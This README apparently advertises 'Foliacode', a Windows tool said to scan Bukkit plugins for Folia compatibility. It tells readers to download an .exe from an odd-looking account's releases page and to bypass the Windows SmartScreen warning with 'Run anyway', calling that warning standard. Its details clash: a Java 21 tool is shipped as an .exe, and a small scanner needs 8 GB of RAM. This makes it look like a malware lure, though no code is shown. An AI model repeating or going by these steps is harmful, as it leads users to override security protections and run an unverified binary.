# ⚙️ Foliacode - Check your plugin compatibility for Folia

[![](https://img.shields.io/badge/Download-Foliacode-blue)](https://github.com/filled-venagenus147/Foliacode/releases)

Foliacode helps server administrators identify potential issues when moving Bukkit plugins to the Folia platform. Folia creates distinct changes in how servers handle tasks and data. Many older plugins rely on outdated systems that fail when they run on Folia. This tool scans your plugin files and provides a plain English report on what you need to fix or replace.

## 📋 System Requirements

*   Operating System: Windows 10 or Windows 11
*   Memory: 8 GB RAM minimum
*   Disk Space: 100 MB free for installation
*   Runtime: Java 21 or newer

Foliacode runs on standard home computers. Ensure you have Java 21 installed on your system before you start. You can download the latest version from the Adoptium website if you do not have it.

## 💾 Downloading the Software

[Visit this page to download the latest version of Foliacode](https://github.com/filled-venagenus147/Foliacode/releases)

1. Navigate to the link provided above.
2. Look for the "Assets" section at the bottom of the newest release post.
3. Click the file ending in `.exe` to start the download.
4. Save the file to a folder you can find easily, such as your Downloads folder or Desktop.

## 🚀 Running the Analysis

Windows might show a warning message when you first open the file because it is a new program. This is standard behavior.

1. Locate the file you just downloaded.
2. If Windows displays a "Windows protected your PC" screen, click "More info" and then select "Run anyway."
3. Open your Command Prompt. You can do this by pressing the Windows key, typing "cmd," and hitting Enter.
4. Move your command window to the folder where you saved the Foliacode file using the CD command. For example, type `cd Downloads` and hit Enter.
5. To test the program, type `foliacode --version` and press Enter. This ensures the program is ready to work.

## 🔍 Analyzing your Plugins

You perform the analysis by pointing the tool at a specific plugin file. 

1. Move the plugin file (for example, `EssentialsX.jar`) into the same folder as your Foliacode program.
2. In the Command Prompt, type the command for your file: `foliacode analyze EssentialsX.jar`.
3. Press Enter. 
4. The program will display a report directly in the window.

## 📈 Understanding the Results

Foliacode categorizes findings by how serious they are. Focus on the results in this order:

*   **CRITICAL:** These items will cause the plugin to crash or stop functioning immediately. You must resolve these before you attempt to enable the plugin on your server.
*   **HIGH:** These items indicate that the plugin ignores the rules required for multi-threaded operation. Risks include corrupted data, server lockups, and unexpected behavior.
*   **MEDIUM:** These items represent best practices that the plugin does not follow. While the plugin might run, these areas could degrade performance over time.

Foliacode identifies the exact line of code causing the issue, explains why the code fails on Folia, and suggests a method to fix it. If the tool reports "NOT READY," do not use that plugin on your production server until you update the code or obtain a newer version from the developer.

## 🛠️ Frequently Asked Questions

**Does this tool change my plugin files?**
No. Foliacode only reads your files. It never deletes, moves, or edits the original plugin jar. It acts as a digital inspector.

**Where can I find help if the tool crashes?**
Ensure you have the full version of Java 21 installed. Check that your file path does not contain special characters. If issues persist, check the main repository page for known bugs.

**Can I scan multiple plugins at once?**
Currently, the program analyzes files one by one. You can run the command multiple times for each file in your library.

**What should I do if the report shows no results?**
If you see no errors, your plugin adheres to the requirements for Folia. You should still perform a test in a sandbox environment before you add the plugin to your live server.

Keywords: folia, bukkit, plugin, minecraft, compatibility, analysis, windows, server, developer, tool